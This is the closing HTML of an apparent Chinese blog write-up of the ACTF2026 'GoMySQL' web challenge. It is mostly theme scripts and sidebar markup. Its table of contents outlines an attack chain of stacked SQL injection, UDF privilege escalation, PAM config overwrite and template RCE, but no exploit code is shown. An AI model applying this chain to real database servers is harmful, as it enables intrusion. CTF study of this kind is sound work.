+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text"> Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gomysql"><span class="toc-number">1.1.</span> <span class="toc-text"> GoMySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-execute-immediate%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.2.</span> <span class="toc-text"> SQL堆叠注入-EXECUTE IMMEDIATE绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-udf%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.3.</span> <span class="toc-text"> SQL堆叠注入-UDF提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.4.</span> <span class="toc-text"> 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F-copy-fail-%E8%A6%86%E7%9B%96-pam-%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.4.1.</span> <span class="toc-text"> 非预期-copy-fail 覆盖 PAM 配置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3-draw%E6%A8%A1%E6%9D%BFrce"><span class="toc-number">1.1.4.2.</span> <span class="toc-text"> 预期解-&#x2F;draw模板rce</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E7%BB%88exp"><span class="toc-number">1.1.5.</span> <span class="toc-text"> 最终exp</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "ACTF2026",
+          url: "http://example.com/2026/05/26/ACTF2026/",
+          excerpt: "",
+          description: "",
+          stripContent: " GoMySQL的模板注入绕死我了😵‍💫   Web  GoMySQL   题目分析  首先看到/calc路由：一个类似计算器一样的东西    加个单引号报错了，猜测存在SQL注入漏洞，这里提示后端用的是MariaDB服务  MariaDB服务器是一个流行的关系型数据库管理系统（RDBMS）。 简单来说，它是一个用来存放和管理数据的软件。你可以把它理解为一个功能强大的“电子表格仓库”，但能处理比Excel多出百万倍的数据，并允许成千上万的用户同时读取或写入。  继续尝试了一下发现存在waf，",
+          date: "Tue May 26 2026 00:13:38 GMT+0800",
+          updated: "Tue May 26 2026 12:30:01 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
